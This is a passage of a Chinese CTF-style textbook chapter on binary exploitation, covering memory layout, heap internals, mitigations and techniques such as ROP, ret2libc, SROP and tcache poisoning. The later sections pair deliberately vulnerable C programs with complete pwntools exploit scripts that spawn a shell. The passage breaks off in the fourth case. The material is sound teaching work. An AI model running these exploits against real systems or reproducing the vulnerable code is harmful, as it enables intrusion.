---
title: "第16章-二进制安全PWN"
type: docs
weight: 16
---

# 第16章 二进制安全PWN — 章节概览

## 引言

二进制安全（Binary Security），在安全圈中常被称为"PWN"（源自"own"的谐音，意为"攻破"），是网络安全攻防领域中最具技术深度的方向之一。它研究的是如何发现并利用二进制程序中的内存安全漏洞，从而实现任意代码执行、权限提升或信息泄露等攻击目标。PWN不仅是CTF竞赛中的核心赛题方向，更是现实世界中高级持续性威胁（APT）和漏洞利用链的关键组成部分。

与Web安全等上层应用安全不同，二进制安全需要攻防人员直接与机器指令、内存布局和操作系统底层机制打交道。这意味着你需要理解CPU是如何执行指令的、栈和堆是如何管理内存的、操作系统是如何加载和保护程序的。这种"贴近硬件"的特性使得PWN成为安全领域中学习曲线最为陡峭、但同时也是最具成就感的方向。

## 本章结构

本章将系统地介绍二进制安全的核心知识体系，从基础理论到实战技巧，帮助读者建立起完整的PWN知识框架。

### 01 理论基础

本节将奠定PWN的理论基石。首先介绍计算机体系结构基础，包括x86/x64架构的寄存器、指令集和调用约定。然后深入讲解内存管理机制，涵盖栈帧结构、堆管理器（ptmalloc2/jemalloc）的工作原理、内存映射（mmap）等核心概念。接着系统梳理常见的内存安全漏洞类型：栈溢出（Stack Buffer Overflow）、堆溢出（Heap Overflow）、格式化字符串漏洞（Format String）、整数溢出（Integer Overflow）、释放后重用（Use-After-Free）、双重释放（Double Free）、类型混淆（Type Confusion）等。最后介绍主流操作系统和编译器提供的各种安全防护机制，包括栈金丝雀（Stack Canary）、地址空间布局随机化（ASLR）、数据执行保护（DEP/NX）、位置无关可执行文件（PIE）、控制流完整性（CFI）等。

### 02 核心技巧

本节将聚焦于PWN中最实用的漏洞利用技术。从最基础的栈溢出控制EIP/RIP开始，逐步讲解ROP（Return-Oriented Programming）链的构造、ret2libc/ret2plt/ret2csu等经典技术、堆利用中的House系列技巧（House of Force、House of Spirit、House of Lore、House of Einherjar等）、SROP（Sigreturn-Oriented Programming）、栈迁移（Stack Pivoting）等高级利用方法。同时介绍编写EXP（Exploit）时的常用工具和框架，特别是pwntools的使用。

### 03 实战案例

本节将通过多个由浅入深的真实或模拟案例，展示完整的漏洞分析和利用过程。从最简单的栈溢出Get Shell开始，到绕过Canary+ASLR+NX的多防护组合，再到堆利用的完整案例，每个案例都将详细展示从逆向分析、漏洞定位、利用思路设计到最终编写EXP的全过程。

### 04 常见误区

本节将纠正在PWN学习过程中常见的认知偏差和技术误区，帮助读者避免走弯路。

### 05 练习方法

本节将提供一套系统化的PWN学习路径和练习资源，包括推荐的CTF平台、靶场环境搭建方法、经典题目的练习顺序等。

### 06 本章小结

总结本章核心知识点，梳理学习要点，并为后续深入学习指明方向。

## 学习目标

通过本章的学习，读者应能够：
1. 理解二进制程序的内存布局和常见内存安全漏洞的成因
2. 掌握栈溢出、堆利用等基本漏洞利用技术
3. 理解并能够绕过常见的安全防护机制（ASLR、NX、Canary等）
4. 使用pwntools等工具编写自动化漏洞利用脚本
5. 具备独立分析和利用二进制漏洞的初步能力

## 前置知识

学习本章需要以下基础知识：
- C语言编程基础（指针、数组、结构体、动态内存管理）
- Linux操作系统基本使用
- 计算机组成原理基础（二进制、寄存器、内存地址）
- 基本的汇编语言阅读能力（建议提前熟悉x86汇编）


***
# 第16章 二进制安全PWN — 理论基础

## 16.1 计算机体系结构基础

### 16.1.1 x86架构概述

理解PWN需要首先理解目标程序运行的硬件环境。x86是目前最广泛使用的指令集架构之一（在服务器和桌面领域），而x86-64（简称x64）是其64位扩展版本。两者在寄存器数量、调用约定和地址空间方面存在关键差异。

**x86（32位）关键寄存器：**
- **EAX**：累加器，用于存放函数返回值和系统调用号
- **EBX**：基址寄存器
- **ECX**：计数器，常用于循环计数
- **EDX**：数据寄存器
- **ESI/EDI**：源/目标索引寄存器，常用于字符串操作
- **EBP**：栈帧基址指针，指向当前栈帧的底部
- **ESP**：栈指针，指向栈顶
- **EIP**：指令指针，指向下一条要执行的指令（PWN的核心目标）
- **EFLAGS**：标志寄存器，存储运算结果的状态标志

**x64（64位）扩展：**
- 所有通用寄存器扩展为64位（RAX、RBX等）
- 新增R8-R15共8个通用寄存器
- 寄存器可以使用低32位（如EAX）、低16位（如AX）和低8位（如AL）
- x64下支持RIP相对寻址，这对PIE和代码复用攻击有重要影响

### 16.1.2 调用约定

调用约定（Calling Convention）规定了函数调用时参数如何传递、返回值如何获取、调用者和被调用者各自需要保存哪些寄存器。

**cdecl（x86 Linux标准）：**
- 参数从右到左压入栈中
- 调用者负责清理栈（通过调整ESP）
- 返回值存放在EAX中
- 调用者保存寄存器：EAX、ECX、EDX
- 被调用者保存寄存器：EBX、ESI、EDI、EBP

**System V AMD64 ABI（x64 Linux标准）：**
- 前6个整数/指针参数通过寄存器传递：RDI、RSI、RDX、RCX、R8、R9
- 前8个浮点参数通过XMM0-XMM7传递
- 超出的参数通过栈传递
- 返回值存放在RAX中（128位返回值使用RAX:RDX）
- 栈必须16字节对齐

**stdcall（Windows API常用）：**
- 参数从右到左压入栈
- 被调用者负责清理栈（通过RET n指令）
- 这一点与cdecl不同，在栈溢出利用中具有重要影响

理解调用约定对PWN至关重要，因为它直接决定了：你需要覆盖多少字节才能到达返回地址、如何向目标函数传递你需要的参数（特别是构造ROP链时）。

### 16.1.3 系统调用机制

系统调用是用户态程序请求内核服务的唯一合法途径。在x86 Linux下，系统调用通过`int 0x80`软中断实现；在x64 Linux下，通过`syscall`指令实现。

**x86系统调用：**
- 系统调用号存放在EAX中
- 参数依次存放在EBX、ECX、EDX、ESI、EDI、EBP中
- 通过`int 0x80`触发

**x64系统调用：**
- 系统调用号存放在RAX中
- 参数依次存放在RDI、RSI、RDX、R10、R8、R9中
- 通过`syscall`指令触发

在PWN中，当无法通过ret2libc获取shell时，可以直接通过`execve("/bin/sh", NULL, NULL)`系统调用来获取shell。在x64下这意味着需要设置：RAX=59（execve的系统调用号）、RDI指向"/bin/sh"字符串、RSI=0、RDX=0。

## 16.2 内存管理机制

### 16.2.1 程序内存布局

Linux进程的虚拟地址空间从低地址到高地址依次为：

```text
0x0000000000000000  ┌─────────────────┐
                    │   保留区域       │  不可读写
                    ├─────────────────┤
                    │   .text段        │  代码段（只读、可执行）
                    ├─────────────────┤
                    │   .rodata段      │  只读数据
                    ├─────────────────┤
                    │   .data段        │  已初始化全局变量
                    ├─────────────────┤
                    │   .bss段         │  未初始化全局变量
                    ├─────────────────┤
                    │       堆         │  向高地址增长 ↗
                    │        ·         │
                    │        ·         │
                    │       mmap区     │  共享库、mmap映射
                    │        ·         │
                    │        ·         │
                    │       栈         │  向低地址增长 ↙
                    ├─────────────────┤
                    │   内核空间       │  用户态不可访问
0x00007FFFFFFFFFFF  └─────────────────┘
```

在x64系统下，用户态可用地址空间为0x0000000000000000到0x00007FFFFFFFFFFF（47位虚拟地址），内核空间占据高地址部分。

### 16.2.2 栈的工作原理

栈是PWN中最核心的攻击目标之一。理解栈的工作原理对掌握栈溢出利用至关重要。

**栈帧结构（x86）：**
```text
高地址
┌─────────────────┐
│    参数2         │  [EBP+12]
├─────────────────┤
│    参数1         │  [EBP+8]
├─────────────────┤
│   返回地址       │  [EBP+4]  ← 栈溢出的核心覆盖目标
├─────────────────┤
│   保存的EBP      │  [EBP]    ← EBP指向此处
├─────────────────┤
│   局部变量       │  [EBP-4], [EBP-8]...
├─────────────────┤
│   ...           │  ESP指向栈顶
└─────────────────┘
低地址
```

**函数调用流程：**
1. 参数压栈（从右到左）
2. 执行`CALL`指令：将返回地址（CALL的下一条指令地址）压栈，跳转到目标函数
3. 保存旧EBP：`push ebp`
4. 建立新栈帧：`mov ebp, esp`
5. 分配局部变量空间：`sub esp, N`
6. 执行函数体
7. 恢复栈帧：`mov esp, ebp`；`pop ebp`
8. 返回：`ret`（弹出返回地址并跳转）

**栈溢出的本质：** 当向栈上的缓冲区写入超过其大小的数据时，会覆盖相邻的内存区域，包括保存的EBP和返回地址。通过精确控制覆盖的返回地址，攻击者可以劫持程序的控制流。

### 16.2.3 堆管理器原理（ptmalloc2）

堆是PWN中另一个重要的攻击面。Linux默认使用的堆管理器是ptmalloc2（glibc的malloc实现）。

**核心数据结构：**

malloc_chunk是堆管理器中最基本的内存块结构：
```c
struct malloc_chunk {
    size_t mchunk_prev_size;  // 前一个chunk的大小（如果前一个chunk空闲）
    size_t mchunk_size;       // 当前chunk的大小（低3位用作标志位）
    struct malloc_chunk* fd;  // 前向指针（仅在空闲chunk中有效）
    struct malloc_chunk* bk;  // 后向指针（仅在空闲chunk中有效）
    // 以下字段仅在large chunk中使用
    struct malloc_chunk* fd_nextsize;
    struct malloc_chunk* bk_nextsize;
};
```

**关键标志位：**
- PREV_INUSE (P)：bit 0，表示前一个chunk是否正在使用
- IS_MMAPPED (M)：bit 1，表示chunk是否通过mmap分配
- NON_MAIN_ARENA (A)：bit 2，表示chunk是否属于非主线程的arena

**Bin（空闲链表）机制：**
- **Fast Bin**：管理较小的chunk（默认<128字节），使用单链表，LIFO（后进先出），不合并相邻空闲chunk
- **Unsorted Bin**：被free的chunk首先进入unsorted bin，下次malloc时会进行分类整理
- **Small Bin**：管理较小的chunk（<512字节），共62个bin，使用双向链表，FIFO
- **Large Bin**：管理较大的chunk（≥512字节），共63个bin，按大小排序的双向链表

**堆操作流程：**

malloc流程：
1. 检查fast bin中是否有合适的chunk
2. 检查small bin中是否有合适的chunk
3. 检查unsorted bin，尝试找到合适的chunk或进行整理
4. 检查large bin，尝试找到best-fit的chunk
5. 如果以上都没有，尝试扩展top chunk或通过brk/mmap分配新内存

free流程：
1. 检查是否与top chunk相邻，如果是则合并到top chunk
2. 检查前一个chunk是否空闲（通过PREV_INUSE标志），如果空闲则合并
3. 检查后一个chunk是否空闲，如果空闲则合并
4. 将chunk放入相应的bin中

**Tcache（Thread Local Caching）：**
glibc 2.26引入了tcache机制，每个线程有独立的缓存。tcache使用单链表管理空闲chunk，最多缓存7个chunk，大小范围为0x20到0x410。tcache的存在大大简化了某些堆利用技术，但也引入了新的安全检查。tcache poisoning是当前PWN中最常见的堆利用技术之一。

### 16.2.4 堆管理器原理（jemalloc）

jemalloc是另一种广泛使用的堆管理器，被Firefox、Android等项目采用。与ptmalloc2不同，jemalloc使用arena、chunk和region三级结构管理内存。jemalloc的利用技术与ptmalloc2差异较大，需要专门学习。

## 16.3 常见内存安全漏洞类型

### 16.3.1 栈缓冲区溢出

栈缓冲区溢出（Stack Buffer Overflow）是最经典、最基础的内存安全漏洞。当程序使用不安全的函数（如`gets()`、`strcpy()`、`scanf("%s", ...)`）向栈上的缓冲区写入数据时，如果没有正确检查输入长度，就会发生溢出。

```c
// 典型的栈溢出漏洞
void vulnerable_function() {
    char buffer[64];
    gets(buffer);  // 没有长度限制，可以溢出buffer
}
```

### 16.3.2 堆溢出

堆溢出发生在向堆上分配的缓冲区写入超过其大小的数据时。与栈溢出相比，堆溢出的利用通常更加复杂，因为需要理解堆管理器的内部结构，但其威力也往往更大，因为堆上存储着各种重要的数据结构和函数指针。

### 16.3.3 格式化字符串漏洞

当用户输入被直接用作`printf()`等格式化函数的格式化字符串时，攻击者可以使用`%x`、`%p`读取栈上的数据，使用`%n`向任意地址写入数据。

```c
// 格式化字符串漏洞
void vulnerable(char *input) {
    printf(input);  // 用户输入直接作为格式化字符串
    // 攻击者可以输入 "%x.%x.%x" 泄露栈数据
    // 或输入 "%n" 进行任意地址写入
}
```

### 16.3.4 整数溢出

整数溢出发生在算术运算结果超出整数类型所能表示的范围时。这可能导致缓冲区分配不足、循环计数错误等问题，进而引发内存安全漏洞。

```c
// 整数溢出导致堆溢出
void vulnerable(int len) {
    if (len + 8 > MAX_SIZE) return;  // len + 8可能溢出为负数/小正数
    char *buf = malloc(len + 8);     // 分配不足的缓冲区
    read(0, buf, len);               // 写入大量数据
}
```

### 16.3.5 释放后重用（Use-After-Free）

UAF漏洞发生在程序释放了一块堆内存后，仍然通过旧指针访问该内存。如果在释放和重新使用之间，该内存被重新分配给了其他对象，攻击者就可能控制该对象的内容。

```c
// UAF漏洞示例
struct Object {
    void (*callback)(void);
    char data[32];
};

struct Object *obj = malloc(sizeof(struct Object));
obj->callback = legitimate_function;
free(obj);  // 释放对象

// ... 此时分配了新的对象占据了同一块内存
struct Object *evil = malloc(sizeof(struct Object));
evil->callback = malicious_function;

obj->callback();  // UAF：调用了malicious_function
```

### 16.3.6 双重释放（Double Free）

对同一块内存执行两次free操作会导致堆管理器的内部数据结构出现不一致，攻击者可以利用这一点实现堆块重叠（chunk overlapping），进而控制关键数据。

### 16.3.7 类型混淆（Type Confusion）

当程序将一个对象当作错误的类型来使用时，就可能发生类型混淆。这在C++中尤其常见，例如将基类指针错误地转换为派生类指针。攻击者可能利用类型混淆来调用错误的虚函数。

## 16.4 安全防护机制

### 16.4.1 栈金丝雀（Stack Canary）

栈金丝雀是在栈帧中返回地址之前插入的一个随机值。程序在函数返回前会检查金丝雀是否被修改，如果被修改则说明发生了栈溢出，程序会终止执行。

```text
┌─────────────────┐
│   返回地址       │
├─────────────────┤
│   Canary         │  ← 溢出会覆盖这个值
├─────────────────┤
│   局部变量       │
└─────────────────┘
```

绕过Canary的常见方法：
- 泄露Canary值（通过格式化字符串漏洞等）
- 覆盖Canary低位字节为`\x00`（在某些情况下可行）
- 利用fork子进程继承父进程Canary的特点，逐字节爆破
- 劫持`__stack_chk_fail`函数

### 16.4.2 地址空间布局随机化（ASLR）

ASLR通过随机化进程的内存布局（栈、堆、共享库的基地址），使得攻击者无法预先知道关键数据和代码的地址。ASLR的随机粒度因操作系统而异，Linux下栈的随机熵为28位，库的随机熵为12位（mmap base）。

绕过ASLR的常见方法：
- 信息泄露漏洞（泄露某个已知地址，推算其他地址）
- 部分覆盖（Partial Overwrite）：只覆盖地址的低字节
- 爆破（在32位系统下，ASLR熵较低，可以暴力猜测）
- 利用未受ASLR保护的模块
- ret2plt：PLT表地址在PIE关闭时不随机化
- bruteforce with fork：fork子进程继承父进程的ASLR布局

### 16.4.3 数据执行保护（DEP/NX）

DEP（Data Execution Prevention）标记数据区域（栈、堆等）为不可执行，防止攻击者直接在这些区域注入并执行shellcode。

绕过DEP的常见方法：
- **ret2libc**：复用libc中的函数（如system()）来执行命令
- **ROP**：复用程序或libc中的代码片段（gadgets）来构造任意操作
- **ret2syscall**：构造系统调用参数并通过syscall指令触发
- **JIT Spraying**：利用JIT编译器在可执行内存中创建shellcode

### 16.4.4 位置无关可执行文件（PIE）

PIE使得可执行文件的加载地址也是随机的，代码段、数据段的地址每次运行都不同。这使得攻击者无法直接使用程序中的固定地址。

绕过PIE的常见方法：
- 信息泄露（泄露程序基地址）
- 部分覆盖
- 利用未随机化的段（如GOT表在PIE下仍然使用相对偏移）

### 16.4.5 控制流完整性（CFI）

CFI通过验证间接控制流转移（如间接调用、间接跳转、函数返回）的目标地址是否合法，来防止ROP等控制流劫持攻击。常见的CFI实现包括Intel CET（Shadow Stack + Indirect Branch Tracking）、LLVM CFI等。

### 16.4.6 RELRO（重定位只读）

RELRO保护GOT表不被覆写：
- **Partial RELRO**：仅重定位GOT表中的部分条目，GOT表仍然可写
- **Full RELRO**：在程序启动时完成所有重定位，然后将GOT表设为只读

Full RELRO使得通过覆写GOT表来劫持控制流的攻击方法失效。

## 16.5 ELF文件格式基础

ELF（Executable and Linkable Format）是Linux下可执行文件、目标文件和共享库的标准格式。理解ELF格式对PWN至关重要，因为你需要知道程序的代码和数据是如何组织的。

**ELF关键结构：**
- **ELF Header**：文件的基本信息（架构、入口地址、段表偏移等）
- **Program Header Table**：描述程序如何被加载到内存（段信息）
- **Section Header Table**：描述文件的节信息（.text、.data、.bss、.got、.plt等）
- **.text**：代码段
- **.data**：已初始化的全局变量
- **.bss**：未初始化的全局变量（在内存中初始为0）
- **.got**：全局偏移表（存储全局变量和库函数的实际地址）
- **.plt**：过程链接表（实现延迟绑定的跳转桩代码）

**延迟绑定（Lazy Binding）：**
当程序第一次调用某个外部函数时，PLT桩代码会跳转到PLT[0]，PLT[0]调用动态链接器（ld.so）来解析函数的真实地址并写入GOT表。之后再调用该函数时，PLT桩代码直接通过GOT表跳转到函数的真实地址。这个机制使得GOT表成为PWN中的重要目标——如果能修改GOT表中的某个条目，就可以劫持对应函数的调用。


***
# 第16章 二进制安全PWN — 核心技巧

## 16.1 栈溢出利用技术

### 16.1.1 基本栈溢出：控制EIP/RIP

最简单的栈溢出利用就是覆盖返回地址，使程序跳转到攻击者指定的地址。

```python
from pwn import *

# 假设buffer大小为64字节，加上8字节saved RBP，返回地址在偏移72处
payload = b'A' * 72          # 填充到返回地址
payload += p64(target_addr)   # 覆盖返回地址
p.send(payload)
```

确定偏移的方法：
- 使用cyclic pattern（pwntools的`cyclic()`函数）生成唯一标识序列，溢出后根据崩溃时的地址反推偏移
- 手动计算：buffer大小 + 可能的对齐填充 + saved RBP（x64下8字节）

### 16.1.2 Shellcode注入

当栈或堆可执行时（关闭了NX），可以直接注入shellcode。

```python
# x64 Linux execve("/bin/sh") shellcode
shellcode = asm(shellcraft.sh())
payload = b'A' * offset + p64(shellcode_addr) + shellcode
```

常见的shellcode编写技巧：
- 避免坏字符（null bytes、换行符等，取决于输入函数）
- 使用短小精悍的syscall序列
- 使用pwntools的`shellcraft`模块自动生成shellcode

### 16.1.3 ret2libc

当栈不可执行（NX开启）时，可以利用程序链接的libc中的函数来完成攻击。

**基本思路：** 覆盖返回地址为libc中`system()`函数的地址，并构造合适的参数（如`"/bin/sh"`字符串的地址）。

```python
# x86 ret2libc
payload = b'A' * offset
payload += p32(system_addr)      # 覆盖返回地址为system
payload += p32(0xdeadbeef)       # 假的返回地址（system执行完会崩溃，无所谓）
payload += p32(bin_sh_addr)      # system的参数："/bin/sh"的地址
```

```python
# x64 ret2libc（参数通过寄存器传递）
payload = b'A' * offset
payload += p64(pop_rdi_ret)      # gadget: pop rdi; ret
payload += p64(bin_sh_addr)      # rdi = "/bin/sh"
payload += p64(system_addr)      # 调用system("/bin/sh")
```

### 16.1.4 ret2plt

当ASLR开启且无法泄露libc地址时，可以通过PLT调用程序已经链接的外部函数。

```python
# 通过PLT调用system，配合泄露libc地址
# 第一步：通过puts@plt泄露某个GOT表项的值（即libc中某函数的真实地址）
payload1 = b'A' * offset
payload1 += p64(pop_rdi_ret)
payload1 += p64(puts_got)        # GOT表中puts的真实地址
payload1 += p64(puts_plt)        # 调用puts@plt
payload1 += p64(main_addr)       # 返回到main，再次利用

# 第二步：计算libc基地址，构造ret2libc
libc_base = leaked_addr - libc_puts_offset
system_addr = libc_base + libc_system_offset
bin_sh_addr = libc_base + libc_bin_sh_offset
```

## 16.2 ROP（Return-Oriented Programming）

### 16.2.1 ROP基本原理

ROP通过复用程序中已有的代码片段（称为gadgets）来构造攻击链。每个gadget以`ret`指令结尾，通过精心布置栈上的返回地址序列，使得程序依次跳转到各个gadget执行。

```text
栈布局：
┌──────────────────┐
│  gadget1_addr     │  ← 返回到 gadget1
├──────────────────┤
│  gadget2_addr     │  ← gadget1的ret跳转到这里
├──────────────────┤
│  gadget3_addr     │  ← gadget2的ret跳转到这里
├──────────────────┤
│       ...        │
└──────────────────┘
```

### 16.2.2 常用Gadgets

```text
# 控制rdi（x64第一个参数）
pop rdi; ret              # 0x?????: 5f c3

# 控制rsi（x64第二个参数）
pop rsi; ret              # 0x?????: 5e c3

# 控制rdx（x64第三个参数）
pop rdx; ret              # 0x?????: 5a c3
# 注意：在glibc中pop rdx; ret比较少见，通常需要pop rdx; pop r12; ret等

# 多寄存器控制
pop rdi; pop rsi; ret     # 常见的组合
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret  # ret2csu

# 内存写入
mov [rdi], rsi; ret       # 将rsi的值写入rdi指向的地址
```

### 16.2.3 ret2csu（通用Gadgets）

__libc_csu_init函数中包含一组通用的gadgets，几乎存在于所有使用glibc的ELF程序中，可以控制rbx、rbp、r12、r13、r14、r15寄存器。

```text
# gadget1: 从__libc_csu_init尾部
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

# gadget2: 紧接gadget1之后
mov rdx, r14    # 或 r15，取决于具体版本
mov rsi, r13    # 或 r14
mov edi, r12d   # 或 r13d
call [r15+rbx*8]  # 间接调用
add rbx, 1
cmp rbp, rbx
jnz ...         # 跳回gadget2
# 如果rbx == rbp，继续执行到：
add rsp, 8
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

使用ret2csu可以轻松控制rdi、rsi、rdx三个寄存器，从而调用任意函数并传递参数。

### 16.2.4 ret2syscall

当没有可用的system函数或"/bin/sh"字符串时，可以直接构造系统调用。

```python
# x64 execve("/bin/sh", NULL, NULL)
# 需要以下gadgets:
# pop rax; ret        -> rax = 59 (execve)
# pop rdi; ret        -> rdi = addr of "/bin/sh"
# pop rsi; ret        -> rsi = 0
# pop rdx; ret        -> rdx = 0
# syscall; ret        -> 触发系统调用

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(59)
payload += p64(pop_rdi_ret) + p64(bin_sh_addr)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(syscall_ret)
```

### 16.2.5 SROP（Sigreturn-Oriented Programming）

SROP利用Linux的sigreturn机制。当信号处理函数返回时，内核会从栈上恢复所有寄存器的状态。攻击者可以伪造sigcontext结构，一次性设置所有寄存器。

```python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.rsp = 0           # or any valid address

payload = b'A' * offset
payload += p64(sigreturn_gadget_addr)  # 触发sigreturn的gadget
payload += p64(syscall_addr)           # sigreturn后执行syscall
payload += bytes(frame)
```

## 16.3 堆利用技术

### 16.3.1 Fast Bin Attack

利用fast bin的LIFO特性，通过UAF或double free修改fast bin chunk的fd指针，使得下一次malloc返回攻击者指定的地址。

### 16.3.2 Unsorted Bin Attack

当unsorted bin中只有一个chunk时，如果该chunk的bk指针被修改，当malloc进行整理时，会向`bk+0x10`的位置写入一个较大的值（main_arena中unsorted bin的地址）。

### 16.3.3 Tcache Poisoning

glibc 2.26+的tcache使用单链表，且早期版本缺乏完整性检查。通过UAF修改tcache chunk的fd指针，可以让malloc返回任意地址。

```python
# tcache poisoning基本思路
# 1. 分配两个相同大小的chunk
malloc(0x20)  # chunk A
malloc(0x20)  # chunk B
# 2. 释放两个chunk（进入tcache）
free(A)
free(B)
# 3. 通过UAF修改B的fd为target_addr
# B->fd = target_addr
# 4. 分配两次，第二次返回target_addr
malloc(0x20)  # 返回B
malloc(0x20)  # 返回target_addr！
```

### 16.3.4 House of Force

利用top chunk的size字段被溢出覆盖为一个很大的值，然后通过malloc一个巨大的size使top chunk移动到目标位置，下一次malloc就返回目标地址。

### 16.3.5 House of Spirit

在栈上伪造一个堆chunk（设置正确的size字段和前后chunk的标志位），然后free这个伪造的chunk。之后malloc相同大小时就会返回栈上的地址，从而实现栈上的任意写入。

### 16.3.6 Off-By-One与堆重叠

Off-by-one漏洞（特别是null byte off-by-one）可以修改下一个chunk的size字段的最低字节，改变chunk的大小。当这个chunk被free并重新分配时，就可能与其他chunk重叠，实现信息泄露或任意写入。

## 16.4 栈迁移（Stack Pivoting）

当栈上的可用空间不足以构造完整的ROP链时，可以将栈指针（ESP/RSP）迁移到其他可控的内存区域（如堆上或BSS段）。

```python
# 使用leave; ret gadget进行栈迁移
# leave = mov rsp, rbp; pop rbp
# 第一步：在原栈上设置saved RBP为新栈地址
payload = b'A' * offset
payload += p64(new_stack_addr)    # 覆盖saved RBP（用于下一步的leave）
payload += p64(leave_ret)         # 触发栈迁移

# 在新栈地址处布置完整的ROP链
```

## 16.5 工具使用

### 16.5.1 pwntools核心功能

```python
from pwn import *

# 连接目标
p = remote('target.com', 1337)   # 远程连接
p = process('./vuln')            # 本地调试

# 数据打包
p64(0xdeadbeef)    # 64位小端打包
p32(0xdeadbeef)    # 32位小端打包
u64(data)          # 64位小端解包

# Shellcode
asm(shellcraft.sh())             # 生成shellcode
asm(shellcraft.cat('/flag'))     # 读取flag文件

# 自动化
cyclic(100)                      # 生成cyclic pattern
cyclic_find(0x61616161)          # 查找偏移

# 调试
gdb.attach(p, 'b *main\nc')     # 附加GDB调试器
```

### 16.5.2 ROPgadget / ROPgadget工具

```bash
# 搜索gadgets
ROPgadget --binary ./vuln --only "pop|ret"
ROPgadget --binary libc.so.6 --string "/bin/sh"
```

### 16.5.3 one_gadget

```bash
# 查找libc中可以直接获取shell的gadget（满足约束条件时）
one_gadget libc.so.6
# 输出类似：
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0, rcx == NULL
```


***
# 第16章 二进制安全PWN — 实战案例

## 案例一：基础栈溢出 — 获取Shell

### 漏洞程序

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // 漏洞：没有长度限制
    printf("Hello, %s!\n", buffer);
}

int main() {
    vuln();
    return 0;
}
```

编译：`gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie`

分析：程序使用`gets()`函数读取输入，没有任何长度限制。缓冲区大小为64字节，加上8字节的saved RBP，返回地址在偏移72处。由于没有开启任何防护（无Canary、无NX、无PIE），可以直接注入shellcode。

### 利用过程

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# 1. 确定偏移
offset = 72  # 64(buffer) + 8(saved RBP)

# 2. 构造shellcode
shellcode = asm(shellcraft.sh())

# 3. 找到buffer的地址（无ASLR，地址固定）
# 通过GDB调试或objdump确定buffer在栈上的地址
buffer_addr = 0x7fffffffe0a0  # 示例地址，实际需要调试获取

# 4. 构造payload
payload = shellcode
payload += b'A' * (offset - len(shellcode))  # 填充剩余空间
payload += p64(buffer_addr)                   # 覆盖返回地址

p.sendline(payload)
p.interactive()  # 获得shell
```

**调试步骤：**
1. 使用`gdb ./vuln`，在`vuln`函数设断点
2. 运行程序，在`gets`调用前查看ESP的值
3. 计算buffer在栈上的地址
4. 确认覆盖偏移正确

***
## 案例二：ret2libc — 绕过NX

### 漏洞程序

```c
// vuln2.c
#include <stdio.h>

void vuln() {
    char buffer[64];
    gets(buffer);
}

int main() {
    printf("libc system: %p\n", system);  // 泄露地址（模拟信息泄露）
    vuln();
    return 0;
}
```

编译：`gcc -o vuln2 vuln2.c -fno-stack-protector -no-pie`

分析：NX开启（栈不可执行），但PIE关闭（程序地址固定）。程序泄露了system的地址，可以直接计算libc基地址。

### 利用过程

```python
from pwn import *

p = process('./vuln2')
elf = ELF('./vuln2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 1. 接收泄露的system地址
p.recvuntil(b'system: ')
system_addr = int(p.recvline().strip(), 16)
log.info(f"system @ {hex(system_addr)}")

# 2. 计算libc基地址
libc_base = system_addr - libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 3. 查找gadgets
pop_rdi_ret = 0x401243  # pop rdi; ret 的地址（用ROPgadget查找）

# 4. 构造ROP链
offset = 72
payload = b'A' * offset
payload += p64(pop_rdi_ret)   # 控制rdi
payload += p64(bin_sh_addr)   # rdi = "/bin/sh"
payload += p64(system_addr)   # 调用system("/bin/sh")

p.sendline(payload)
p.interactive()
```

***
## 案例三：泄露Canary + ret2libc

### 漏洞程序

```c
// vuln3.c
#include <stdio.h>
#include <unistd.h>

void vuln() {
    char buffer[64];
    write(1, "Input: ", 7);
    int n = read(0, buffer, 200);  // 可以溢出，但有Canary保护
    write(1, buffer, n);           // 可以泄露Canary
}

int main() {
    vuln();
    return 0;
}
```

编译：`gcc -o vuln3 vuln3.c -no-pie`

分析：程序开启了Canary保护，但由于`read`读取的数据多于buffer大小，可以溢出。同时`write`会将buffer内容输出，如果覆盖时保留Canary的原值，就可以泄露它。

### 利用过程

```python
from pwn import *

p = process('./vuln3')
elf = ELF('./vuln3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 第一步：泄露Canary
# Canary的最低字节总是\x00，所以它在buffer之后（偏移64处）
p.sendafter(b'Input: ', b'A' * 65)  # 多发一个字节，覆盖Canary的\x00
p.recv(65)
canary = u64(b'\x00' + p.recv(7))   # 读取Canary的后7字节
log.info(f"Canary: {hex(canary)}")

# 第二步：泄露libc地址（通过puts@plt泄露__libc_start_main的返回地址）
pop_rdi_ret = 0x401243
puts_plt = elf.plt['puts']
puts_got = elf.got['__libc_start_main']  # 或其他已解析的GOT条目
main_addr = elf.symbols['main']

payload1 = b'A' * 64
payload1 += p64(canary)          # 保持Canary不变
payload1 += p64(0)               # saved RBP
payload1 += p64(pop_rdi_ret)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)       # 返回main再次利用

p.send(payload1)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.info(f"libc base: {hex(libc_base)}")

# 第三步：ret2libc获取shell
payload2 = b'A' * 64
payload2 += p64(canary)
payload2 += p64(0)
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

***
## 案例四：堆利用 — Tcache Poisoning

### 漏洞程序

```c
// vuln4.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *chunks[10];

void alloc() {
    int idx, size;
    printf("Index: "); scanf("%d", &idx);
    printf("Size: "); scanf("%d", &size);
    if (idx >= 0 && idx < 10) {
        chunks[idx] = malloc(size);
        printf("Data: "); read(0, chunks[idx], size);
    }
}

void delete() {
    int idx;
